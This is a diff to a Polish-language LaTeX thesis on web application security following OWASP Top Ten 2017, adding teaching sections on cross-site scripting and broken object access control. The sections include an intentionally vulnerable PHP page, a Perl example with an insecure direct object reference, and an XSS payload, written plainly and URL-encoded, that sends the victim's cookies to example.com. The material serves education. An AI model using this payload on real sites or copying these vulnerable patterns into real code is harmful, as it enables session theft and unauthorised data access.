@@ -4,9 +4,13 @@
 \usepackage{babel}
 \usepackage{indentfirst}
 \usepackage{listings}
+\usepackage{graphicx}
 
 \setcounter{secnumdepth}{3}
 \setcounter{tocdepth}{3}
+
+\graphicspath{ {images/} }
+
 
 \lstdefinelanguage{diff}{
   morecomment=[f][\color{blue}]{@@},     % group identifier
@@ -65,7 +69,7 @@ Realizacja pracy wymagała zapoznania się z technologiami wykorzystywanymi przy
 % OWASP TOP 10
 Współczesne aplikacje internetowe są wielowarstwowe i wykorzystują różne technologie, m.in.~kod wykonywany po stronie klienta (JavaScript), kod wykonywany po stronie serwera (np.~PHP, Python, Ruby), bazy danych, itp.. Każda z tych technologii jest narażona na obecność podatności, które mogą być wykorzystane przez crackerów do wykradzenia informacji poufnych.
 
-Internetowa społeczność \textbf{Open Web Application Security Project (OWASP)}\cite{owasp} zajmuje się tworzeniem artykułów, dokumentacji i narzędzi związanych z bezpieczeństwem sieci komputerowych. Jeden z ich największych projektów to \textbf{OWASP Top Ten}, którego celem jest podniesienie świadomości użytkowników na temat bezpieczeństwa aplikacji przez publikowane listy 10 najważniejszych zagrożeń.
+Internetowa społeczność \textbf{Open Web Application Security Project (OWASP)}\cite{owasp} zajmuje się tworzeniem artykułów, dokumentacji i narzędzi związanych z bezpieczeństwem sieci komputerowych. Jeden z ich największych projektów to \textbf{OWASP Top Ten}, którego celem jest podniesienie świadomości użytkowników na temat bezpieczeństwa aplikacji przez publikowane listy 10 najważniejszych zagrożeń. Poniżej zaprezentowano listę zagrożeń aplikacji internetowych wg \textbf{OWASP Top Ten 2017 Project}.
 
 \subsection{Iniekcja kodu}
 Iniekcja kodu to wykorzystanie błędu, który pozwala na przekazanie do wykonania niezaufanych danych wprowadzonych z zewnątrz. Potencjalnie narażona jest na to każda aplikacja w której użytkownik może wprowadzić dane. Atak polega na wprowadzeniu tekstu, który wykorzystuje składnię atakowanego interpretera, stąd jest on prosty do wykonania i bardzo skuteczny. Szczególnie narażone są następujące technologie: SQL, LDAP, XPath, NoSQL, polecenia systemu operacyjnego, parsery XML. itp.. Iniekcja może spowodować wyciek informacji, utratę danych (lub ich uszkodzenie), a w skrajnych przypadkach nawet całkowite przejęcie kontroli nad systemem.
@@ -128,7 +132,6 @@ Użytkownik \textit{B} po wejściu na otrzymany adres będzie zalogowany z upraw
 Innym, bardziej prawdopodobnym atakiem jest przekazanie ofierze adresu z spreparowanym identyfikatorem sesji. Jeżeli aplikacja nie regeneruje identyfikatora po zalogowaniu, to atakujący będzie mógł przejąć sesję, jeśli ofiara zaloguje się przy pomocy przekazanego adresu. Na taki atak był podatny system CMS Symphony2 (CVE-2016-4309). Przy błędnie skonfigurowanym interpreterze języka PHP (brak wymuszenia przechowywania identyfikatora sesji w ciasteczku) atakujący mógł wymusić konkretny identyfikator sesji przy pomocy parametru \textit{PHPSESSID} przekazanego w URI. Stosowna poprawka pojawiła się w repozytorium projektu i usunęła wskazaną podatność (przykład \ref{symphonydiff}).
 
 \begin{lstlisting}[language=diff,frame=single,caption=łatka naprawiająca podatność fiksacji sesji w Symphony2 \cite{symphony},label=symphonydiff,numbers=left]
-
 diff --git a/symphony/lib/core/class.session.php b/symphony/lib/core/class.session.php
 index c0075a1..dedb526 100644
 --- a/symphony/lib/core/class.session.php
@@ -146,7 +149,81 @@ index c0075a1..dedb526 100644
 \end{lstlisting}
 
 \subsection{Cross-site scripting (XSS)}
-\subsection{Brak restrykcji bezpośredniego dostępu do obiektu}
+\textit{Cross-Site Scripting} (XSS) to sposób ataku na aplikację internetową, który polega na możliwości osadzenia kodu JavaScript w treści strony internetowej w taki sposób, by był on wykonany po stronie przeglądarki ofiary ataku. Atak ten jest możliwy jeżeli aplikacja zmienia zawartość strony internetowej na podstawie danych wprowadzonych z zewnątrz (np. parametry GET/POST) bez uprzedniej zamiany znaków specjalnych HTML na encje. 
+
+Wyróżnia się dwa rodzaje ataku XSS:
+\begin{itemize}
+\item persistent XSS --- kiedy kod zostaje zapamiętany przez aplikację internetową i jest wyświetlony każdemu odwiedzającemu,
+\item non-persistent XSS --- kiedy kod jest dostępny tylko w odpowiedzi na konkretne żądanie HTTP.
+\end{itemize}
+
+Wykonanie dowolnego kodu JavaScript po stronie przeglądarki ofiary może mieć następujące skutki:
+\begin{itemize}
+\item przejęcie sesji użytkownika lub innych danych przechowywanych w ciasteczkach,
+\item podmiana zawartości strony internetowej (np. numerów kont bankowych do przelewu),
+\item przekierowanie użytkownika na inną stronę,
+\item pobranie złośliwego oprogramowania,
+\item przesłanie zawartości strony (np. danych osobowych) na inny serwer.
+\end{itemize}
+
+\subsubsection*{Przykład}
+Przykład \ref{xss1} zawiera kod strony podatnej na atak XSS. W ciasteczku przechowywana jest wartość \textit{secret=password}. Następnie na stronie wyświetla się napis \textit{Hello <var>}, gdzie \textit{var} to parametr przekazany w URL.
+
+\begin{lstlisting}[language=php,frame=single,caption=przykładowy kod strony podatnej na XSS,label=xss1,numbers=left]
+<?php
+
+setcookie("secret", "password");
+echo "<h1>Hello ".$_GET["name"]."</h1>";
+
+?>
+\end{lstlisting}
+
+Przekazanie kodu \ref {xss2} w postaci parametru \textit{name} spowoduje wykonanie tego kodu po stronie przeglądarki. Efektem wywołania będzie przekierowanie użytkownika na adres internetowy z przekazaną zawartością ciasteczka w adresie URL.
+
+\begin{lstlisting}[language=php,frame=single,caption=przykład wykorzystania podatności XSS,label=xss2,numbers=left]
+<script>document.location="http://example.com/?c="+document.cookie;</script>
+
+%3Cscript%3Edocument.location%3D%22http%3A%2F%2Fexample.com%2F%3Fc%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E (wersja zakodowana)
+\end{lstlisting}
+
+W 2014 roku odkryto podatność aplikacji TweetDeck \cite{tweetdeck} (działającej jako rozszerzenie do przeglądarki Google Chrome), która oferowała interakcję z popularnym serwisem społecznościowym Twitter. Podatność polegała na renderowaniu treści tweeta z wykorzystaniem silnika interpretującego JavaScript i bez zamiany danych pobranych z API na encje.
+
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.75]{tweetdeck}
+\label{tweetdeckpng}
+\caption{tweet wykorzystujący podatność XSS w TweetDeck}
+\end{figure}
+
+Użytkownik \textit{@derGeruhn} zamieścił na swoim profilu wpis, który wykorzystywał odnalezioną podatność. Wyświetlony w aplikacji TweetDeck zawierał tylko emotikonę serca, a poprzedzający ją kod został wykonany z uprawnieniami ofiary. Zamieszczony kod powodował rozpowszechnienie wpisu przez skopiowanie go na profil ofiary (\textit{ang. retweet}). Próba usunięcia wpisu kończyła się pojawieniem się komunikatu ,,XSS in Tweetdeck''.
+
+\subsection{Błędna kontrola dostępu do obiektu}
+Ataki wykorzystujące błędną kontrolę dostępu do obiektu polegają na podmianie parametrów autoryzujących lub bezpośrednie wywołanie niepublicznych funkcji, do których dostęp nie jest odpowiednio weryfikowany. Jest to szczególnie ważne przy projektowaniu publicznych API, gdzie URL często zawiera nazwy obiektów. Przez modyfikowanie tej nazwy można odwołać się do obiektu, do którego nie mamy dostępu. Jest to podatność prosta do wykrycia, niestety jej obecność może umożliwić ujawnienie poufnych danych zgromadzonych w systemie.
+
+\subsubsection*{Przykład}
+Kod (przykłąd \ref{da01}) odpowiada za pobranie wiadomości prywatnych użytkownika. Załóżmy, że funkcja \textit{LookupMessageObject} weryfikuje czy dane są numeryczne, a wiadomości są składowane w jednym miejscu (niezależnie od użytkownika), identyfikowane wyłącznie wg identyfikatora tej wiadomości. Kod aplikacji prawidłowo sprawdza czy użytkownik jest zalogowany. Wywołanie funkcji \textit{DisplayPrivateMessage} nie weryfikuje uprawnień zalogowanego użytkownika do żądanej wiadomości. Każdy zalogowany użytkownik może modyfikując parametr \textit{id} próbować pobrać dowolną wiadomość (zakładając sekwencyjne przydzielanie identyfikatora jest to bardzo proste) z pozytywnym skutkiem.
+
+\begin{lstlisting}[language=perl,frame=single,caption=przykładowy kod podatny na bezpośrednie odwołanie \cite{directaccess},label=da01,numbers=left]
+sub DisplayPrivateMessage {
+my($id) = @_;
+my $Message = LookupMessageObject($id);
+print "From: " . encodeHTML($Message->{from}) . "<br>\n";
+print "Subject: " . encodeHTML($Message->{subject}) . "\n";
+print "<hr>\n";
+print "Body: " . encodeHTML($Message->{body}) . "\n";
+}
+
+my $q = new CGI;
+# For purposes of this example, assume that CWE-309 and
+# CWE-523 do not apply.
+if (! AuthenticateUser($q->param('username'), $q->param('password'))) {
+ExitError("invalid username or password");
+}
+
+my $id = $q->param('id');
+DisplayPrivateMessage($id);
+\end{lstlisting}
+
 \subsection{Błędna konfiguracja bezpieczeństwa}
 \subsection{Ujawnienie wrażliwych danych}
 \subsection{Brak kontroli dostępu na poziomie wykonania funkcji}
@@ -189,6 +266,8 @@ Web Application Firewall to...
 \bibitem{modsec} https://modsecurity.org/
 \bibitem{owasp} https://www.owasp.org/
 \bibitem{symphony} https://github.com/symphonycms/symphony-2/commit/b329a14adc40868965076a77210452e396243dcd.diff
+\bibitem{tweetdeck} http://www.businessinsider.com/tweetdeck-major-security-vulnerability-twitter-2014-6 [dostęp 03.05.2017 r.]
+\bibitem{directaccess} https://cwe.mitre.org/data/definitions/285.html
 \end{thebibliography}
 
 \end{document}
